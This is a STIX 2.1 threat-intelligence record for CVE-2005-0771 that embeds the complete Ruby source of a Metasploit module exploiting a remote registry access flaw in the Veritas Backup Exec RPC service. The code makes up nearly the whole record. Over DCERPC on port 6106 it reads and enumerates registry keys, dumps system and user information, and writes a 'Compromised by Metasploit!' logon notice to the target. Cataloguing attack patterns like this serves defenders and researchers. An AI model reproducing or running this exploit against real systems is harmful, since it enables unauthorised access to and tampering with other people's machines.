{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76d1e9dd-824c-48b9-b918-a4306b99b864",
    "created": "2024-08-14T16:22:49.65423Z",
    "modified": "2024-08-14T16:22:49.654234Z",
    "name": "Veritas Backup Exec Server Registry Access",
    "description": " This modules exploits a remote registry access flaw in the BackupExec Windows Server RPC service. This vulnerability was discovered by Pedram Amini and is based on the NDR stub information posted to openrce.org. Please see the action list for the different attack modes.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/backupexec/registry.rb",
            "external_id": "registry.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0771"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20110801042138/http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=269"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Veritas Backup Exec Server Registry Access',\n      'Description'    => %q{\n        This modules exploits a remote registry access flaw in the BackupExec Windows\n      Server RPC service. This vulnerability was discovered by Pedram Amini and is based\n      on the NDR stub information posted to openrce.org.\n      Please see the action list for the different attack modes.\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '17627' ],\n          [ 'CVE', '2005-0771' ],\n          [ 'URL', 'https://web.archive.org/web/20110801042138/http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=269'],\n        ],\n      'Actions'     =>\n        [\n          ['System Information', 'Description' => 'Dump system info (user, owner, OS, CPU...)'],\n          ['Create Logon Notice', 'Description' => 'Add a logon notice']\n        ],\n      'DefaultAction' => 'System Information'\n      ))\n\n      register_options(\n        [\n          Opt::RPORT(6106),\n          OptString.new('WARN',\n            [\n              false,\n              \"The warning to display for the Logon Notice action\",\n              \"Compromised by Metasploit!\\r\\n\"\n            ]\n          ),\n        ])\n  end\n\n  def auxiliary_commands\n    return {\n      \"regread\" => \"Read a registry value\",\n      # \"regenum\" => \"Enumerate registry keys\",\n    }\n  end\n\n  def run\n    case action.name\n      when 'System Information'\n        system_info()\n      when 'Create Logon Notice'\n        logon_notice()\n    end\n  end\n\n\n  def cmd_regread(*args)\n\n    if (args.length == 0)\n      print_status(\"Usage: regread HKLM\\\\\\\\Hardware\\\\\\\\Description\\\\\\\\System\\\\\\\\SystemBIOSVersion\")\n      return\n    end\n\n    paths  = args[0].split(\"\\\\\")\n    hive   = paths.shift\n    subval = paths.pop\n    subkey = paths.join(\"\\\\\")\n    data   = backupexec_regread(hive, subkey, subval)\n\n    if (data)\n      print_status(\"DATA: #{deunicode(data)}\")\n    else\n      print_error(\"Failed to read #{hive}\\\\#{subkey}\\\\#{subval}...\")\n    end\n\n  end\n\n  def cmd_regenum(*args)\n\n    if (args.length == 0)\n      print_status(\"Usage: regenum HKLM\\\\\\\\Software\")\n      return\n    end\n\n    paths  = args[0].split(\"\\\\\")\n    hive   = paths.shift\n    subkey = \"\\\\\" + paths.join(\"\\\\\")\n    data   = backupexec_regenum(hive, subkey)\n\n    if (data)\n      print_status(\"DATA: #{deunicode(data)}\")\n    else\n      print_error(\"Failed to enumerate #{hive}\\\\#{subkey}...\")\n    end\n\n  end\n\n  def system_info\n    print_status(\"Dumping system information...\")\n\n    prod_id   = backupexec_regread('HKLM', 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion', 'ProductId') || 'Unknown'\n    prod_name = backupexec_regread('HKLM', 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion', 'ProductName') || 'Windows (Unknown)'\n    prod_sp   = backupexec_regread('HKLM', 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion', 'CSDVersion') || 'No Service Pack'\n    owner     = backupexec_regread('HKLM', 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion', 'RegisteredOwner') || 'Unknown Owner'\n    company   = backupexec_regread('HKLM', 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion', 'RegisteredOrganization') || 'Unknown Company'\n    cpu       = backupexec_regread('HKLM', 'Hardware\\\\Description\\\\System\\\\CentralProcessor\\\\0', 'ProcessorNameString') || 'Unknown CPU'\n    username  = backupexec_regread('HKCU', 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer', 'Logon User Name') || 'SYSTEM'\n\n    print_status(\"The current interactive user is #{deunicode(username)}\")\n    print_status(\"The operating system is #{deunicode(prod_name)} #{deunicode(prod_sp)} (#{deunicode(prod_id)})\")\n    print_status(\"The system is registered to #{deunicode(owner)} of #{deunicode(company)}\")\n    print_status(\"The system runs on a #{deunicode(cpu)}\")\n  end\n\n  def logon_notice\n    print_status(\"Setting the logon warning to #{datastore['WARN'].strip}...\")\n    backupexec_regwrite('HKLM', 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon', 'LegalNoticeText',  REG_SZ, datastore['WARN'])\n    backupexec_regwrite('HKLM', 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon', 'LegalNoticeCaption',  REG_SZ, 'METASPLOIT')\n  end\n\n\n  def deunicode(str)\n    str.gsub(/\\x00/, '').strip\n  end\n\n  #\n  # Write a registry key\n  #\n  def backupexec_regwrite(hive, subkey, subval, type, data)\n    stub = backupexec_regrpc_write(\n      :hive => registry_hive_lookup(hive),\n      :subkey => subkey,\n      :subval => subval,\n      :type => type,\n      :data => data\n    )\n    resp = backupexec_regrpc_call(5, stub)\n    return false if resp.length == 0\n    return true\n  end\n\n  #\n  # Read a registry key\n  #\n  def backupexec_regread(hive, subkey, subval, type = REG_SZ)\n    stub = backupexec_regrpc_read(\n      :hive => registry_hive_lookup(hive),\n      :subkey => subkey,\n      :subval => subval,\n      :type => type\n    )\n    resp = backupexec_regrpc_call(4, stub)\n\n    return nil if resp.length == 0\n    ret, len = resp[0,8].unpack('VV')\n    return nil if ret == 0\n    return nil if len == 0\n    return resp[8, len]\n  end\n\n  #\n  # Enumerate a registry key\n  #\n  def backupexec_regenum(hive, subkey)\n    stub = backupexec_regrpc_enum(\n      :hive => registry_hive_lookup(hive),\n      :subkey => subkey\n    )\n    resp = backupexec_regrpc_call(7, stub)\n    p resp\n\n    return nil if resp.length == 0\n    ret, len = resp[0,8].unpack('VV')\n    return nil if ret == 0\n    return nil if len == 0\n    return resp[8, len]\n  end\n\n  #\n  # Call the backupexec registry service\n  #\n  def backupexec_regrpc_call(opnum, data = '')\n\n    handle = dcerpc_handle(\n      '93841fd0-16ce-11ce-850d-02608c44967b', '1.0',\n      'ncacn_ip_tcp', [datastore['RPORT']]\n    )\n\n    dcerpc_bind(handle)\n\n    resp = dcerpc.call(opnum, data)\n    outp = ''\n\n    if (dcerpc.last_response and dcerpc.last_response.stub_data)\n      outp = dcerpc.last_response.stub_data\n    end\n\n    disconnect\n\n    outp\n  end\n\n  # RPC Service 4\n  def backupexec_regrpc_read(opts = {})\n    subkey = opts[:subkey] || ''\n    subval = opts[:subval] || ''\n    hive   = opts[:hive]   || HKEY_LOCAL_MACHINE\n    type   = opts[:type]   || REG_SZ\n\n    stub =\n      NDR.UnicodeConformantVaryingString(subkey) +\n      NDR.UnicodeConformantVaryingString(subval) +\n      NDR.long(type) +\n      NDR.long(1024) +\n      NDR.long(0) +\n      NDR.long(4) +\n      NDR.long(4) +\n      NDR.long(hive)\n    return stub\n  end\n\n  # RPC Service 7\n  def backupexec_regrpc_enum(opts = {})\n    subkey = opts[:subkey] || ''\n    hive   = opts[:hive]   || HKEY_LOCAL_MACHINE\n    stub =\n      NDR.UnicodeConformantVaryingString(subkey) +\n      NDR.long(4096) +\n      NDR.long(0) +\n      NDR.long(4) +\n      NDR.long(4) +\n      NDR.long(hive)\n    return stub\n  end\n\n  # RPC Service 5\n  def backupexec_regrpc_write(opts = {})\n    subkey = opts[:subkey] || ''\n    subval = opts[:subval] || ''\n    hive   = opts[:hive]   || HKEY_LOCAL_MACHINE\n    type   = opts[:type]   || REG_SZ\n    data   = opts[:data]   || ''\n\n    if (type == REG_SZ || type == REG_EXPAND_SZ)\n      data = Rex::Text.to_unicode(data+\"\\x00\")\n    end\n\n    stub =\n      NDR.UnicodeConformantVaryingString(subkey) +\n      NDR.UnicodeConformantVaryingString(subval) +\n      NDR.long(type) +\n      NDR.long(data.length) +\n      NDR.long(data.length) +\n      data +\n      NDR.align(data) +\n      NDR.long(4) +\n      NDR.long(4) +\n      NDR.long(hive)\n    return stub\n  end\nend\n"
}